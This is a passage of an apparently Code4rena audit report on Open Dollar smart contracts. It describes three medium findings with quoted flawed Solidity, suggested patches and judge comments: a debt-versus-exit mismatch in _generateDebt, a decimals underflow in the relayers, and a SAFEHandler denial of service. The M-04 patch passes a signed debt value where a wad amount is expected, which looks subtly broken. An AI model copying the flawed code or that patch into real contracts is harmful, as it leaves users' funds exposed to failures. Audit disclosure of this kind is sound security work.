class=\"mtk3\">// @audit : _deltaWad is different from the one used to generate dabt in safeEngine</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L31-L47\">BasicActions._getGeneratedDeltaDebt function</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getGeneratedDeltaDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_cType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeHandler</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaWad</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_rate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">cData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_cType</span><span class=\"mtk1\">).</span><span class=\"mtk12\">accumulatedRate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_coinAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">coinBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeHandler</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// If there was already enough COIN in the safeEngine balance, just exits it without adding more debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_coinAmount</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_deltaWad</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">RAY</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Calculates the needed deltaDebt so together with the existing coins in the safeEngine is enough to exit wad amount of COIN tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\"> = ((</span><span class=\"mtk12\">_deltaWad</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">RAY</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_coinAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">_rate</span><span class=\"mtk1\">).</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// This is neeeded due lack of precision. It might need to sum an extra deltaDebt wei (for the given COIN wad amount)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">_rate</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_deltaWad</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">RAY</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Update <code>_generateDebt</code> function to use the same modified <code>_deltaWad</code> value for generating debt and minting system tokens:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">function _generateDebt(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address _manager,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address _taxCollector,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address _coinJoin,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _safeId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _deltaWad</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address _safeEngine = ODSafeManager(_manager).safeEngine();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   int256 _UpdatedDeltaDebt=_getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Generates debt in the SAFE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _modifySAFECollateralization(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      _manager,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      _safeId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-     _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+     _UpdatedDeltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Moves the COIN amount to user&#39;s address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   _collectAndExitCoins(_manager, _coinJoin, _safeId, _deltaWad);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   _collectAndExitCoins(_manager, _coinJoin, _safeId, _UpdatedDeltaDebt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/371#issuecomment-1787839429\">pi0neerpat (OpenDollar) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/371#issuecomment-1792581760\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>In <code>_generateDebt()</code>, <code>_collectAndExitCoins()</code> is called to transfer system coins equivalent to the requested amount of collateral instead of the actual amount used for debt. This will cause the function to revert should <code>_deltaWad</code> be higher than the amount of collateral the user has in his safe to generate debt. </p>\n<p>Since this is a case of the function not working as intended, I believe medium severity is appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-decimal-limitation-in-camelotrelayer-and-univ3relayer-contract-deployment\" style=\"position:relative;\"><a href=\"#m-05-decimal-limitation-in-camelotrelayer-and-univ3relayer-contract-deployment\" aria-label=\"m 05 decimal limitation in camelotrelayer and univ3relayer contract deployment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/323\">[M-05] Decimal Limitation in CamelotRelayer and UniV3Relayer Contract Deployment</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/323\">0xmystery</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/446\">phoenixV110</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/439\">hals</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/437\">ni8mare</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/407\">Tendency</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/327\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/298\">spark</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/257\">0x6d6164616e</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/238\">niki</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/215\">twcctop</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/147\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/58\">0xsurena</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/43\">ZanyBonzy</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/34\">cryptothemex</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/18\">0xWaitress</a></em></p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L58\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L58</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L103-L105\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L103-L105</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/UniV3Relayer.sol#L64\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/UniV3Relayer.sol#L64</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/UniV3Relayer.sol#L110-L112\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/UniV3Relayer.sol#L110-L112</a></p>\n<p>The current design of the CamelotRelayer and UniV3Relayer contracts limits its compatibility to only those <code>_quoteTokens</code> that have a decimal count of 18 or fewer. If an attempt is made to deploy the contract with a token having more than 18 decimals as the <code>_quoteToken</code>, the contract deployment will fail due to an underflow issue during the multiplier calculation. This poses no financial risk but restricts the contract’s adaptability in the wider DeFi ecosystem, preventing its use with tokens that have more than 18 decimals.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The restriction emerges from the constructor, where the <code>multiplier</code> is deduced as <code>18 - IERC20Metadata(_quoteToken).decimals()</code>.</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L58\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L58</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/UniV3Relayer.sol#L64\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/UniV3Relayer.sol#L64</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">IERC20Metadata</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_quoteToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>For tokens like <a href=\"https://etherscan.io/token/0xaba8cac6866b83ae4eec97dd07ed254282f6ad8a\"><code>YAMv2</code>, which possess 24 decimals</a>, the computation would attempt <code>18 - 24</code>, which results in an underflow, making the contract deployment unsuccessful.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Alter the datatype of <code>multiplier</code> to <code>int256</code> to account for both positive and negative values.</li>\n<li>Adjust the multiplier’s computation in the constructor to handle situations where token decimals might be greater or less than 18.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">int8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimalsDifference</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">int8</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IERC20Metadata</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_quoteToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">decimalsDifference</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<ol start=\"3\">\n<li>Revise the <code>_parseResult</code> function to either multiply or divide the <code>_quoteResult</code> depending on the <code>multiplier</code> value.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_parseResult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteResult</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_result</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteResult</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteResult</span><span class=\"mtk1\"> / (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(-</span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteResult</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Note: It will require additional code refactoring to make <code>baseAmount</code> and its value assignment as <code>int256</code> as well.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/323#issuecomment-1787830556\">pi0neerpat (OpenDollar) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/323#issuecomment-1790123541\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how <code>CamelotRelayer.sol</code> and <code>UniV3Relayer.sol</code> cannot be deployed for tokens with more than 18 decimals, which limits the functionality of the protocol unnecessarily. As such, medium severity is appropriate. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-safehandler-contract-doesnt-have-any-method-to-call-to-odsafemanagerallowhandler-lead-to-dos-in-some-function\" style=\"position:relative;\"><a href=\"#m-06-safehandler-contract-doesnt-have-any-method-to-call-to-odsafemanagerallowhandler-lead-to-dos-in-some-function\" aria-label=\"m 06 safehandler contract doesnt have any method to call to odsafemanagerallowhandler lead to dos in some function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/297\">[M-06] SafeHandler contract doesn’t have any method to call to <code>ODSafeManager.allowHandler()</code>, lead to DOS in some function</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/297\">tnquanghuy0512</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/414\">0xprinc</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/314\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/307\">Baki</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/303\">Tendency</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/249\">COSMIC-BEE-REACH</a></em></p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/SAFEHandler.sol#L1-L19\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/SAFEHandler.sol#L1-L19</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L112-L115\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L112-L115</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L59-L62\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L59-L62</a></p>\n<p>SafeHandler contract doesn’t have any method to call to <code>ODSafeManager.allowHandler()</code>. Because of that, functions in ODSafeManager contract which use <code>handlerAllowed</code> modifier will never be called successfully. There’re two function <code>quitSystem()</code> and <code>enterSystem()</code> that use <code>handlerAllowed</code> modifier.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is the whole SAFEHandler contract, it doesn’t have any method that call to <code>ODSafeManager.allowHandler()</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: GPL-3.0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ISAFEEngine</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;@interfaces/ISAFEEngine.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SAFEHandler</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approveSAFEModification</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 